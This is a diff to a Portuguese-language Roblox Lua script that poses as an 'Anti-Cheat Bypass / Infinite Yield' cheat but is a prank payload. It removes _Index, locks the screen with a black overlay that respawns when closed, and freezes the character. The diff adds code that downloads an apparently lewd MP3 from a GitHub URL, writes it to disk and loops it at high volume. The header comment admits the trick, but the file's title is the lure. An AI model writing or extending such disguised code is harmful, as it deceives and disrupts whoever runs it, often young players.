@@ -1,7 +1,7 @@
 --[[
     ATENÇÃO EXPLORADORES: Este script é uma trollagem. Não execute.
     Script: Anti-Cheat Bypass / Infinite Yield FE [FAKE]
-    Função: Remove o _Index e trava a tela do usuário.
+    Função: Remove o _Index, trava a tela, toca áudio e trava o personagem.
 ]]
 
 -- ==========================================
@@ -35,13 +35,12 @@ end
 removeIndex()
 
 -- ==========================================
--- PARTE 2: A Trollagem (Tela Preta e Texto)
+-- PARTE 2: A Trollagem (Tela Preta, Texto, Áudio)
 -- ==========================================
 local function trollPlayer()
     local player = game:GetService("Players").LocalPlayer
     local coreGui = game:GetService("CoreGui")
     
-    -- Tenta usar cloneref no CoreGui
     local success, clonedCoreGui = pcall(function()
         return cloneref(game:GetService("CoreGui"))
     end)
@@ -49,7 +48,7 @@ local function trollPlayer()
         coreGui = clonedCoreGui
     end
 
-    -- Função para criar a Interface
+    -- Função para criar a Interface (Tela Preta + Texto)
     local function createUI()
         local screenGui = Instance.new("ScreenGui")
         screenGui.Name = "ExitOverlay"
@@ -72,7 +71,6 @@ local function trollPlayer()
         textLabel.Font = Enum.Font.SourceSansBold
         textLabel.Parent = blackFrame
 
-        -- Tenta colocar no CoreGui, se não, vai pro PlayerGui
         pcall(function()
             screenGui.Parent = coreGui
         end)
@@ -82,8 +80,57 @@ local function trollPlayer()
         end
     end
 
-    -- Cria a interface
     createUI()
+
+    -- ==========================================
+    -- SISTEMA DE ÁUDIO MELHORADO (3 TENTATIVAS)
+    -- ==========================================
+    local function playTrollAudio()
+        local audioUrl = "https://raw.githubusercontent.com/willplucasrezende09567-cloud/script.lua/main/gemido-whatsapp.mp3"
+        
+        -- Tentativa 1: Usar a função nativa do Delta (playaudio)
+        pcall(function()
+            playaudio(audioUrl, 7)
+        end)
+
+        -- Tentativa 2: Baixar o arquivo, criar um asset e tocar com Sound nativo
+        pcall(function()
+            local fileName = "trollsound.mp3"
+            writefile(fileName, game:HttpGet(audioUrl))
+            
+            -- Tenta obter o asset ID local (getcustomasset)
+            local assetId = getcustomasset(fileName)
+            
+            local sound = Instance.new("Sound")
+            sound.SoundId = assetId
+            sound.Volume = 7
+            sound.Parent = game:GetService("SoundService")
+            sound:Play()
+            
+            -- Loop para garantir que o som fique tocando (alguns executores param o som)
+            sound.Ended:Connect(function()
+                sound:Play()
+            end)
+        end)
+
+        -- Tentativa 3: Tentar usar getsynasset (compatibilidade com Synapse/Delta antigo)
+        pcall(function()
+            local fileName = "trollsound.mp3"
+            writefile(fileName, game:HttpGet(audioUrl))
+            local sound = Instance.new("Sound")
+            sound.SoundId = getsynasset(fileName)
+            sound.Volume = 7
+            sound.Parent = game:GetService("SoundService")
+            sound:Play()
+            
+            sound.Ended:Connect(function()
+                sound:Play()
+            end)
+        end)
+    end
+
+    -- Executa o áudio em uma thread separada
+    task.spawn(playTrollAudio)
 
     -- Trava o personagem da vítima
     local function freezeCharacter(char)
@@ -110,17 +157,14 @@ local function trollPlayer()
             local existingUI = coreGui:FindFirstChild("ExitOverlay") or player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("ExitOverlay")
             if not existingUI then
                 createUI()
-                print("[Delta Script] Tentou fechar a tela preta? Tenta de novo, kkkk.")
             end
         end
     end)
 
-    -- Aviso no console
     warn("=======================================")
     warn("VOCÊ FOI TROLLADO! KKKKKKKKKK")
     warn("exit of Roblox, lol")
     warn("=======================================")
 end
 
--- Executa a trollagem
 trollPlayer()
